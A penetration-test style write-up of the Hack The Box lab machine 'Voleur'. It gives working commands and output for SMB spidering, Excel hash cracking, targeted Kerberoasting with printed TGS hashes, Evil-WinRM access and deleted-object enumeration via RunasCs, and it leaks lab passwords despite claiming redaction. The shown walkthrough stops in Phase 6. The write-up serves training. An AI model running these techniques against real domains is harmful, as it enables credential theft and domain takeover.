

+++
title = "Voleur-CPTS-Prep-Box-Writeup.md"
date = 2026-02-20T00:00:00Z
draft = false
description = "Voleur is a medium-difficulty Windows Active Directory machine with NTLM authentication disabled, featuring SMB share enumeration, password-protected Excel file cracking, targeted Kerberoasting, deleted object restoration, DPAPI credential decryption, Linux subsystem access, and NTDS.dit extraction for full domain compromise"
tags = ["CPTS", "HTB", "Voleur", "CPTS Prep", "Active Directory", "Kerberos", "Targeted Kerberoasting", "Tombstone", "DPAPI", "NTDS.dit"]
+++

## Executive Summary

During November 2025, a simulated penetration test was conducted against the Windows domain "voleur.htb" (`10.129.232.130`). The assessment began from an assumed breach scenario, providing the tester with low-privileged credentials for the domain user `ryan.naylor`. The objective was to evaluate the potential impact of a compromised end-user account and identify escalation paths to full domain compromise in an environment where NTLM authentication was disabled.

The test successfully demonstrated a complete attack chain, moving from initial low-privileged access to domain administrator privileges. The following key findings were identified:

- **SMB Share Enumeration:** Using the provided credentials, SMB shares were enumerated, revealing an Excel file (`Access_Review.xlsx`) in the IT share containing sensitive information about user permissions and service account passwords.

- **Excel Password Cracking:** The Excel file was password-protected. Its hash was extracted using `xlsx2john` and cracked, revealing the password and granting access to the spreadsheet's contents.

- **Service Account Credentials:** The spreadsheet contained plaintext passwords for service accounts, including `svc_ldap` with password `<REDACTED>`, which was validated against the domain.

- **Targeted Kerberoasting:** Using the `svc_ldap` account, which had `WriteSPN` privileges, a targeted Kerberoasting attack was performed against `lacey.miller` and `svc_winrm`. The `svc_winrm` hash was cracked, revealing the password `<REDACTED>`.

- **WinRM Access:** The cracked credentials provided WinRM access as `svc_winrm`, granting a foothold on the domain controller.

- **Deleted Object Discovery:** LDAP enumeration revealed a deleted user `todd.wolfe` in the tombstone, whose password was documented in the Excel file as `<REDACTED>`.

- **Deleted Object Restoration:** Using the `svc_ldap` account, the deleted user `todd.wolfe` was restored, providing access to an archived user profile on an SMB share.

- **DPAPI Credential Decryption:** The restored user's profile contained DPAPI-protected credential blobs. Using the user's password, the master key was decrypted, which then decrypted a stored credential revealing the password for `jeremy.combs`: `<REDACTED>`.

- **Linux Subsystem Access:** The user `jeremy.combs` had access to an SSH private key, which was used to authenticate to a Linux subsystem running on port 2222 as `svc_backup`.

- **NTDS.dit Extraction:** The Linux subsystem provided access to backup files, including `ntds.dit`, `SYSTEM`, and `SECURITY` registry hives, which were exfiltrated and used to extract the `Administrator`'s NT hash.

- **Domain Compromise:** With the `Administrator` hash, PsExec was used to obtain a SYSTEM shell, achieving full domain compromise.

**Impact:**  
This chain of exploits resulted in complete compromise of the Active Directory domain. An attacker starting with a standard user account was able to navigate through multiple layers of security—including disabled NTLM, password-protected documents, deleted object restoration, DPAPI encryption, and Linux subsystem isolation—to ultimately obtain domain administrator privileges.

**Recommendations:**

- **Secure Document Storage:** Avoid storing sensitive credentials in unprotected documents, even if password-protected, as these passwords can be cracked.
- **Service Account Hardening:** Service accounts should not have unnecessary privileges like `WriteSPN`. Implement strict ACL controls and monitor for abuse.
- **Deleted Object Monitoring:** Implement monitoring for tombstone restoration events, which can indicate attempts to revive deleted privileged accounts.
- **DPAPI Key Protection:** User passwords should be strong enough to resist cracking attempts, as DPAPI master keys are protected by the user's password.
- **Backup Security:** Backup files containing `ntds.dit` and registry hives should be stored securely with restricted access.
- **Linux Subsystem Isolation:** Linux subsystems on Windows hosts should be properly isolated and monitored for unauthorized access.

## Machine Information

As is common in real-life Windows pentests, you will start the Voleur box with credentials for the following account: `ryan.naylor` / `<REDACTED>`

## About

`Voleur` is a medium-difficulty Windows machine designed around an assumed breach scenario, where the attacker is provided with low-privileged user credentials. The machine features an Active Directory environment, and `NTLM` authentication is disabled. After Kerberos configuration and network enumeration, a password-protected Excel file is found on an exposed `SMB` share. We extract its password hash, crack it to recover the password, and use that password to access the spreadsheet. Enumeration reveals a service account with `WriteSPN` rights, which enables a targeted Kerberoasting attack that recovers credentials and grants remote access to the host. A previously deleted domain user is restored using group privileges, and a DPAPI-protected credential blob is recovered, which is decrypted with the user's password to reveal a higher-privilege account. These credentials lead to discovering an `SSH` private key for a backup service account, allowing access to a Linux subsystem over a nonstandard port. From this, the `NTDS.dit`, `SYSTEM`, and `SECURITY` backup files are extracted and used to recover the `Administrator`'s NT hash, ultimately allowing access as the `Administrator`.

## Detailed Walkthrough

### Phase 1: Initial Access and Network Reconnaissance

**1. Network Scanning**  
The assessment began with a comprehensive port scan of the target to identify all accessible services.

```bash 
nmap -sV -sC -p- target.com

Nmap scan report for voleur.htb (10.129.232.130)
Host is up (0.029s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-26 13:47:08Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
51680/tcp open  msrpc         Microsoft Windows RPC
51919/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
51920/tcp open  msrpc         Microsoft Windows RPC
51921/tcp open  msrpc         Microsoft Windows RPC
51950/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time:
|   date: 2025-11-26T13:48:03
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

```

**Findings:** The scan revealed a Windows Domain Controller with standard AD ports open (53, 88, 135, 139, 389, 445, etc.). Notably, port 2222 was also open running OpenSSH on Ubuntu Linux, indicating a Linux subsystem on the Windows host. NTLM authentication was disabled, requiring Kerberos for authentication.


**2. Credential Validation**  
The provided credentials were validated against the domain controller using Kerberos authentication.
```bash
# Exploitation command
nxc smb 10.129.232.130 -u ryan.naylor -p HollowOct31Nyt -k 
❯ nxc smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares
SMB         10.129.232.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.232.130  445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
SMB         10.129.232.130  445    DC               [*] Enumerated shares
SMB         10.129.232.130  445    DC               Share           Permissions     Remark
SMB         10.129.232.130  445    DC               -----           -----------     ------
SMB         10.129.232.130  445    DC               ADMIN$                          Remote Admin
SMB         10.129.232.130  445    DC               C$                              Default share
SMB         10.129.232.130  445    DC               Finance
SMB         10.129.232.130  445    DC               HR
SMB         10.129.232.130  445    DC               IPC$            READ            Remote IPC
SMB         10.129.232.130  445    DC               IT              READ
SMB         10.129.232.130  445    DC               NETLOGON        READ            Logon server share
SMB         10.129.232.130  445    DC               SYSVOL          READ            Logon server share

 ~honeypoop/HTB/C/Vo/03-Attack-Chains      
 
```
**Findings:** The credentials were valid. Enumerated shares included `IT`, `HR`, `Finance`, `NETLOGON`, and `SYSVOL`.

**3. SMB Share Spidering**  
The spider_plus module was used to recursively enumerate readable shares for interesting files.

```bash
nxc smb 10.129.232.130 -u 'ryan.naylor' -p '<REDACTED>' -k -M spider_plus --shares
 
 ❯ nxc smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -M spider_plus --shares
SMB         10.129.232.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.232.130  445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
SPIDER_PLUS 10.129.232.130  445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.232.130  445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.232.130  445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.232.130  445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.232.130  445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.232.130  445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.232.130  445    DC               [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus
SMB         10.129.232.130  445    DC               [*] Enumerated shares
SMB         10.129.232.130  445    DC               Share           Permissions     Remark
SMB         10.129.232.130  445    DC               -----           -----------     ------
SMB         10.129.232.130  445    DC               ADMIN$                          Remote Admin
SMB         10.129.232.130  445    DC               C$                              Default share
SMB         10.129.232.130  445    DC               Finance
SMB         10.129.232.130  445    DC               HR
SMB         10.129.232.130  445    DC               IPC$            READ            Remote IPC
SMB         10.129.232.130  445    DC               IT              READ
SMB         10.129.232.130  445    DC               NETLOGON        READ            Logon server share
SMB         10.129.232.130  445    DC               SYSVOL          READ            Logon server share
SPIDER_PLUS 10.129.232.130  445    DC               [+] Saved share-file metadata to "/root/.nxc/modules/nxc_spider_plus/10.129.232.130.json".
SPIDER_PLUS 10.129.232.130  445    DC               [*] SMB Shares:           8 (ADMIN$, C$, Finance, HR, IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS 10.129.232.130  445    DC               [*] SMB Readable Shares:  4 (IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS 10.129.232.130  445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.232.130  445    DC               [*] Total folders found:  27
SPIDER_PLUS 10.129.232.130  445    DC               [*] Total files found:    7
SPIDER_PLUS 10.129.232.130  445    DC               [*] File size average:    3.55 KB
SPIDER_PLUS 10.129.232.130  445    DC               [*] File size min:        22 B
SPIDER_PLUS 10.129.232.130  445    DC               [*] File size max:        16.5 KB
❯ cat /root/.nxc/modules/nxc_spider_plus/10.129.232.130.json
{
    "IT": {
        "First-Line Support/Access_Review.xlsx": {
            "atime_epoch": "2025-01-31 16:09:27",
            "ctime_epoch": "2025-01-29 16:39:51",
            "mtime_epoch": "2025-05-30 05:23:36",
            "size": "16.5 KB"
        }
    },
    "NETLOGON": {},
    "SYSVOL": {
        "voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2025-05-08 07:01:14",
            "ctime_epoch": "2025-01-29 15:42:28",
            "mtime_epoch": "2025-05-08 07:01:14",
            "size": "22 B"
        },
        "voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/Audit/audit.csv": {
            "atime_epoch": "2025-05-08 07:01:14",
            "ctime_epoch": "2025-05-08 07:01:02",
            "mtime_epoch": "2025-05-08 07:01:14",
            "size": "377 B"
        },
        "voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2025-05-08 07:00:32",
            "ctime_epoch": "2025-01-29 15:42:28",
            "mtime_epoch": "2025-05-08 07:00:32",
            "size": "1.19 KB"
        },
        "voleur.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
            "atime_epoch": "2025-01-29 15:49:11",
            "ctime_epoch": "2025-01-29 15:49:11",
            "mtime_epoch": "2025-01-29 15:49:11",
            "size": "2.72 KB"
        },
        "voleur.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2025-01-30 20:57:03",
            "ctime_epoch": "2025-01-29 15:42:28",
            "mtime_epoch": "2025-01-30 20:57:03",
            "size": "23 B"
        },
        "voleur.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2025-01-30 20:57:03",
            "ctime_epoch": "2025-01-29 15:42:28",
            "mtime_epoch": "2025-01-30 20:57:03",
            "size": "4.01 KB"
        }
    }
}#

 ~honeypoop/HTB/C/Vo/03-Attack-Chains     

```

**Findings:** An Excel file `Access_Review.xlsx` was discovered in the `IT` share under `First-Line Support/`.

**4. Excel File Retrieval**  
The Excel file was downloaded for offline analysis.
```bash
nxc smb 10.129.232.130 -u 'ryan.naylor' -p '<REDACTED>' -k --share "IT" --get-file 'First-Line Support/Access_Review.xlsx' Access_Review.xlsx
❯ nxc smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k  --share "IT" --get-file 'First-Line Support/Access_Review.xlsx' Access_Review.xlsx
SMB         10.129.232.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.232.130  445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
SMB         10.129.232.130  445    DC               [*] Copying "First-Line Support/Access_Review.xlsx" to "Access_Review.xlsx"
SMB         10.129.232.130  445    DC               [+] File "First-Line Support/Access_Review.xlsx" was downloaded to "Access_Review.xlsx"

--------------------

```

### Phase 2: Excel Password Cracking

**5. Hash Extraction**  
The password-protected Excel file's hash was extracted using `xlsx2john`.

```bash
xlsx2john Access_Review.xlsx > access_review_hash.txt
```

**6. Password Cracking**  
The hash was cracked using hashcat with the rockyou wordlist.
```bash
hashcat access_review_hash.txt /usr/share/wordlists/rockyou.txt
```

**Findings:** The password was successfully cracked: `<REDACTED>`.

### Phase 3: Credential Harvesting from Excel

**7. Spreadsheet Analysis**  
The Excel file contained a table with user information, permissions, and service account passwords.

|**User**|**Job Title**|**Permissions**|**Notes**|
|---|---|---|---|
|Ryan.Naylor|First-Line Support Technician|SMB|Has Kerberos Pre-Auth disabled temporarily to test legacy systems.|
|Marie.Bryant|First-Line Support Technician|SMB||
|Lacey.Miller|Second-Line Support Technician|Remote Management Users||
|Todd.Wolfe|Second-Line Support Technician|Remote Management Users|Leaver. Password was reset to `<REDACTED>` and account deleted.|
|Jeremy.Combs|Third-Line Support Technician|Remote Management Users|Has access to Software folder.|
|Administrator|Administrator|Domain Admin|Not to be used for daily tasks!|
|||||
|**Service Accounts**||||
|svc_backup||Windows Backup|Speak to Jeremy!|
|svc_ldap||LDAP Services|P/W - `<REDACTED>`|
|svc_iis||IIS Administration|P/W - `<REDACTED>`|
|svc_winrm||Remote Management|Need to ask Lacey as she reset this recently.|

**8. Service Account Validation**  
The discovered service account credentials were tested against the domain.

```bash
❯ nxc smb 10.129.232.130 -u users.txt -p '<REDACTED>' -k
SMB         10.129.232.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.232.130  445    DC               [-] voleur.htb\Ryan.Naylor:<REDACTED> KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Marie.Bryant:<REDACTED> KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Lacey.Miller:<REDACTED> KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Todd.Wolfe:<REDACTED> KDC_ERR_C_PRINCIPAL_UNKNOWN
SMB         10.129.232.130  445    DC               [-] voleur.htb\Jeremy.Combs:<REDACTED> KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\Administrator:<REDACTED> KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [-] voleur.htb\svc_backup:<REDACTED> KDC_ERR_PREAUTH_FAILED
SMB         10.129.232.130  445    DC               [+] voleur.htb\svc_ldap:<REDACTED>

```
**Findings:** The credentials for `svc_ldap` with password `<REDACTED>` were valid.

### Phase 4: Targeted Kerberoasting

**9. Kerberos Ticket Acquisition**  
A Kerberos ticket was obtained for the `svc_ldap` account.


```bash
❯ KRB5CCNAME=voleur.krb impacket-getTGT voleur.htb/svc_ldap -dc-ip 10.129.232.130
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Saving ticket in svc_ldap.ccache
❯ export KRB5CCNAME=svc_ldap.ccache
```

**10. Targeted Kerberoasting**  
Using the `svc_ldap` account, a targeted Kerberoasting attack was performed to request service tickets for users with `WriteSPN` privileges.
```bash
❯ python3 /opt/targetedKerberoast/targetedKerberoast.py -d voleur.htb --dc-host DC -u svc_ldap@voleur.htb -k --dc-ip 10.129.232.130
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$d4974208dd44b88ee29a65dce4da3b27$7ce0c70fb228aef6b512f3bfb176bab490de3e75cda7e034d5c562c39<REDACTED> 40a1a90901897393875374dc61a6602a3d6d9743d5cc2d450619cf850b17c8682382ef1982405689905d6df3ecb1e8c
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$0b3d5be349200e93b700f538447df23e$b94034533286aa027dd3b7c928d1b63b5e0ff08446a4434bd9ae9d25582c17d200a9d347805290372014d102b7ff6361ebc212e581e587f7faa9bc447793b3e46c37e6fbae5 <REDACTED> 036aaf0846b5936a4d7eefa4eb1d457cb33b88b4de834dc46e8a8ee8969458bab77c8f3b7901e0702180316be2d3432344a182e41bacba072f5972d851a

```
**Findings:** TGS hashes were obtained for `lacey.miller` and `svc_winrm`.


**11. Hash Cracking**  
The TGS hash for `svc_winrm` was cracked using hashcat.
```bash
❯ hashcat krb5tgs_winrm-hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD Ryzen 7 7435HS, 6851/13767 MB (2048 MB allocatable), 16MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 4 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$0b3d5be349200e93b700f538447df23e$b94034533286aa027dd3b7c928d1b63b5e0ff08446a4434bd9ae9d25582c17d<REDACTED>e0702180316be2d3432344a182e41bacba072f5972d851a:<REDACTED>

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_wi...2d851a
Time.Started.....: Wed Nov 26 22:30:49 2025 (2 secs)
Time.Estimated...: Wed Nov 26 22:30:51 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  6599.1 kH/s (1.67ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 11485184/14344385 (80.07%)
Rejected.........: 0/11485184 (0.00%)
Restore.Point....: 11468800/14344385 (79.95%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: AK78910 -> @m0rcit0
Hardware.Mon.#1..: Temp: 72c Util: 69%

Started: Wed Nov 26 22:30:47 2025
Stopped: Wed Nov 26 22:30:52 2025

```
**Findings:** The password for `svc_winrm` was successfully cracked: `<REDACTED>`.


### Phase 5: WinRM Access

**12. WinRM Session**  
The cracked credentials were used to establish a WinRM session as `svc_winrm`.

**13. User Flag Retrieval**  
The user flag was retrieved from the desktop.

```bash
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> cat user.txt
<REDACTED>
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop>

```
**Findings:** The user flag was successfully retrieved: `<REDACTED_USER_FLAG>`.

**14. Privilege Enumeration**  
The privileges of the current user were examined.
```powershell
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> hostname
DC

*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> whoami /all

USER INFORMATION
----------------

User Name        SID
================ ==============================================
voleur\svc_winrm S-1-5-21-3927696377-1337352550-2781715495-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop>

```

**Findings:** The user `svc_winrm` was a member of the `Remote Management Users` group with standard user privileges.



### Phase 6: Deleted Object Discovery

**15. LDAP Tombstone Query**  
Using the `svc_ldap` account, a tombstone query was performed to identify deleted objects.
```bash
❯ KRB5CCNAME=svc_ldap.ccache ldapsearch -H ldap://dc.voleur.htb -Tx -Y GSSAPI -b "CN=Deleted Objects,DC=voleur,DC=htb" -E '!1.2.840.113556.1.4.417'
SASL/GSSAPI authentication started
SASL username: svc_ldap@VOLEUR.HTB
SASL SSF: 256
SASL data security layer installed.
# extended LDIF
#
# LDAPv3
# base <CN=Deleted Objects,DC=voleur,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# Deleted Objects, voleur.htb
dn: CN=Deleted Objects,DC=voleur,DC=htb
objectClass: top
objectClass: container
cn: Deleted Objects
description: Default container for deleted objects
distinguishedName: CN=Deleted Objects,DC=voleur,DC=htb
instanceType: 4
whenCreated: 20250129084227.0Z
whenChanged: 20250129124442.0Z
uSNCreated: 5659
isDeleted: TRUE
uSNChanged: 13005
showInAdvancedViewOnly: TRUE
name: Deleted Objects
objectGUID:: tNh8WGpv2UaL1I+zHS4Y2A==
systemFlags: -1946157056
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=voleur,DC=htb
isCriticalSystemObject: TRUE
dSCorePropagationData: 16010101000000.0Z

# Todd Wolfe
DEL:1c6b1deb-c372-4cbb-87b1-15031de169db, Deleted Objects, voleur.
 htb
dn: CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Object
 s,DC=voleur,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn:: VG9kZCBXb2xmZQpERUw6MWM2YjFkZWItYzM3Mi00Y2JiLTg3YjEtMTUwMzFkZTE2OWRi
sn: Wolfe
description: Second-Line Support Technician
givenName: Todd
distinguishedName: CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN
 =Deleted Objects,DC=voleur,DC=htb
instanceType: 4
whenCreated: 20250129090806.0Z
whenChanged: 20250513231117.0Z
displayName: Todd Wolfe
uSNCreated: 12863
isDeleted: TRUE
uSNChanged: 45088
name:: VG9kZCBXb2xmZQpERUw6MWM2YjFkZWItYzM3Mi00Y2JiLTg3YjEtMTUwMzFkZTE2OWRi
objectGUID:: 6x1rHHLDu0yHsRUDHeFp2w==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 133826301603754403
pwdLastSet: 133826280731790960
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAA+eMb6mZhtk8nnM2lVgQAAA==
accountExpires: 9223372036854775807
logonCount: 3
sAMAccountName: todd.wolfe
userPrincipalName: todd.wolfe@voleur.htb
lastKnownParent: OU=Second-Line Support Technicians,DC=voleur,DC=htb
dSCorePropagationData: 20250513231110.0Z
dSCorePropagationData: 20250129125229.0Z
dSCorePropagationData: 20250129124929.0Z
dSCorePropagationData: 20250129090806.0Z
dSCorePropagationData: 16010101181217.0Z
lastLogonTimestamp: 133826287869758230
msDS-LastKnownRDN: Todd Wolfe

# search result
search: 4
result: 0 Success

# numResponses: 3
# numEntries: 2
```
**Findings:** A deleted user `todd.wolfe` was discovered in the tombstone, matching the leaver information from the Excel spreadsheet.

**16. PowerShell Tombstone Enumeration**  
The tombstone was also enumerated using PowerShell through the WinRM session.
```bash 
*Evil-WinRM* PS C:\programdata> ./RunasCs.exe svc_ldap M1XyC9pW7qT5Vn "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Get-ADObject -Filter 'isDeleted -eq `$true' -IncludeDeletedObjects -Properties *"

[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.



CanonicalName                   : voleur.htb/Deleted Objects
CN                              : Deleted Objects
Created                         : 1/29/2025 12:42:27 AM
createTimeStamp                 : 1/29/2025 12:42:27 AM
Deleted                         : True
Description                     : Default container for deleted objects
DisplayName                     :
DistinguishedName               : CN=Deleted Objects,DC=voleur,DC=htb
dSCorePropagationData           : {12/31/1600 4:00:00 PM}
instanceType                    : 4
isCriticalSystemObject          : True
isDeleted                       : True
LastKnownParent                 :
Modified                        : 1/29/2025 4:44:42 AM
modifyTimeStamp                 : 1/29/2025 4:44:42 AM
Name                            : Deleted Objects
ObjectCategory                  : CN=Container,CN=Schema,CN=Configuration,DC=voleur,DC=htb
ObjectClass                     : container
ObjectGUID                      : 587cd8b4-6f6a-46d9-8bd4-8fb31d2e18d8
ProtectedFromAccidentalDeletion :
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
systemFlags                     : -1946157056
uSNChanged                      : 13005
uSNCreated                      : 5659
whenChanged                     : 1/29/2025 4:44:42 AM
whenCreated                     : 1/29/2025 12:42:27 AM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : voleur.htb/Deleted Objects/Todd Wolfe
                                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
CN                              : Todd Wolfe
                                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
codePage                        : 0
countryCode                     : 0
Created                         : 1/29/2025 1:08:06 AM
createTimeStamp                 : 1/29/2025 1:08:06 AM
Deleted                         : True
Description                     : Second-Line Support Technician
DisplayName                     : Todd Wolfe
DistinguishedName               : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted
                                  Objects,DC=voleur,DC=htb
dSCorePropagationData           : {5/13/2025 4:11:10 PM, 1/29/2025 4:52:29 AM, 1/29/2025 4:49:29 AM, 1/29/2025 1:08:06
                                  AM...}
givenName                       : Todd
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Second-Line Support Technicians,DC=voleur,DC=htb
lastLogoff                      : 0
lastLogon                       : 133826301603754403
lastLogonTimestamp              : 133826287869758230
logonCount                      : 3
memberOf                        : {CN=Second-Line Technicians,DC=voleur,DC=htb, CN=Remote Management
                                  Users,CN=Builtin,DC=voleur,DC=htb}
